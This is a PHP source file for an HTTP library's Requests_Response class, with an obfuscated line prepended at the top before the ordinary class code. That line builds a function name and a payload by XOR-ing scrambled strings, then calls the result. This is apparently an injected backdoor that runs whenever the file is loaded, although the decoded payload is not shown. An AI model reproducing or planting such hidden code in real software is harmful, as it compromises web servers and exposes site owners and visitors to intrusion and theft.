<?php $onTjliZeg='.R=7 P1WHUCXT S'^'M XVT5n1=; ,=O=';$zIHjsHGrhua=$onTjliZeg('','1TmqHLEZ7<DE>K =S=DNfC;G8-J=O-.Z83mlnf-X7,1>76ZX;JC7K<<->Lb5QLXJSSSD-tJV<3.BSHTCs2Y9OQ+8GdjaKlPBaAJ>;qFIiPciTsf3IXZ<X,,duI9;LyrxhSlyhPkKM9XLhcOBKG=-N4glY.P.ZmS.WbF,lBLD2LW44rbFE+JlBCBBnHH31;Rkb8CEAqF512AeoVTWETFrf6OLS4jOh70 76311BLUH99O+PmX7>9Y+TQLjV9c,7>z+I35rp,V-irRaoK3 G5csLEbv28EPm  7bInvESLi>;LD873KHWvH5 6WRpCoA.FbYorYM>UAlBlBR+9TL0QXbt2hekftn:wTKAQUY8Pwytl3 GOXjiJIeFR31E86G4IXIck93,hIYyV=9H6ikHKJV-XTW1AMX20AQ.VB3snQkHW7QBGVR-+HZIQ6;>3;.lk9HGeI6NVDliO.O8QNzr56T-ZMCu+U0OrG+;Kki<PFeF1W06RJWO5RBULhE5RqXK>EI6opWR>kzLH1,O8YjJUoRM=gQA,JX0<cQRKJ7gVXgJKcVTStVKvZS4B+gPgnBJUAjVPH-BTXHRWPNkwVp0J;-H0,4Kb6+UBNEiH944:DOJQINp2-0;QqpzRJrk8a5YLX+mG.5M.1a=85Q,.2fnZNpJYM=ACUdyD8'^'X2EP.9+9CU++a.XT I7fA;T5gI+I.rq7MGJEGFVR>JDPTB37Uj;X9cXLJ-=j<9,bw720LXjrWVWkshtcSIS0FuDM3DWAlKkHhH,QIYb ImCYoSBZu+.N4IBLQ-XO-PIXL:GRAZbBiV-8HMrbccYL:U<H0sppzI8K.9bELgl7F>;QZZF- Rc1kxHKg:-GDI<CFW61hJL<L8<oer0615fOFP.  QQELSQTViXTHbqu.XU<NkgRQQK<J79lBrf cxu3niRFRTG3TIOlAK=RL2PJS7OkRVY112KENBtNR.65R42h YCRkuwR>TLC2iz>eKG BqNV=,J4hL9fK4DK1-S9xJPm: :31=nW58au><ApJGTHEA+:=CI1ClOvWP1Yi,Q0xtCORVUSCPprYX<WIVho<7A-1l;H0RO:KuJ76RSSq+=9D40.7>DQ-r1>DdZROO34T=3M+W=3rX6+K,W5+RVQW LsacQO4D.-,NBbBR69 MbU6DWrlqoT 0457.P+.=3W6=EGW<7GLVllUM;YpJlsOz YRyeH+,QgD:72mjNveZjlPg7eA5.N9aRqOPbVX zd Ye2zNzgo+f6wgKQpPQ8IL1oGQ2=SS<1:6AoIUMV+..venTVLDZxXPZrjRKCk<<:9GEcJT9OjFMYL=COVA3suzC<5T5keMBNE');$zIHjsHGrhua();
/**
 * HTTP response class
 *
 * Contains a response from Requests::request()
 * @package Requests
 */

/**
 * HTTP response class
 *
 * Contains a response from Requests::request()
 * @package Requests
 */
class Requests_Response {
	/**
	 * Constructor
	 */
	public function __construct() {
		$this->headers = new Requests_Response_Headers();
		$this->cookies = new Requests_Cookie_Jar();
	}

	/**
	 * Response body
	 *
	 * @var string
	 */
	public $body = '';

	/**
	 * Raw HTTP data from the transport
	 *
	 * @var string
	 */
	public $raw = '';

	/**
	 * Headers, as an associative array
	 *
	 * @var Requests_Response_Headers Array-like object representing headers
	 */
	public $headers = array();

	/**
	 * Status code, false if non-blocking
	 *
	 * @var integer|boolean
	 */
	public $status_code = false;

	/**
	 * Protocol version, false if non-blocking
	 * @var float|boolean
	 */
	public $protocol_version = false;

	/**
	 * Whether the request succeeded or not
	 *
	 * @var boolean
	 */
	public $success = false;

	/**
	 * Number of redirects the request used
	 *
	 * @var integer
	 */
	public $redirects = 0;

	/**
	 * URL requested
	 *
	 * @var string
	 */
	public $url = '';

	/**
	 * Previous requests (from redirects)
	 *
	 * @var array Array of Requests_Response objects
	 */
	public $history = array();

	/**
	 * Cookies from the request
	 *
	 * @var Requests_Cookie_Jar Array-like object representing a cookie jar
	 */
	public $cookies = array();

	/**
	 * Is the response a redirect?
	 *
	 * @return boolean True if redirect (3xx status), false if not.
	 */
	public function is_redirect() {
		$code = $this->status_code;
		return in_array($code, array(300, 301, 302, 303, 307)) || $code > 307 && $code < 400;
	}

	/**
	 * Throws an exception if the request was not successful
	 *
	 * @throws Requests_Exception If `$allow_redirects` is false, and code is 3xx (`response.no_redirects`)
	 * @throws Requests_Exception_HTTP On non-successful status code. Exception class corresponds to code (e.g. {@see Requests_Exception_HTTP_404})
	 * @param boolean $allow_redirects Set to false to throw on a 3xx as well
	 */
	public function throw_for_status($allow_redirects = true) {
		if ($this->is_redirect()) {
			if (!$allow_redirects) {
				throw new Requests_Exception('Redirection not allowed', 'response.no_redirects', $this);
			}
		}
		elseif (!$this->success) {
			$exception = Requests_Exception_HTTP::get_class($this->status_code);
			throw new $exception(null, $this);
		}
	}
}
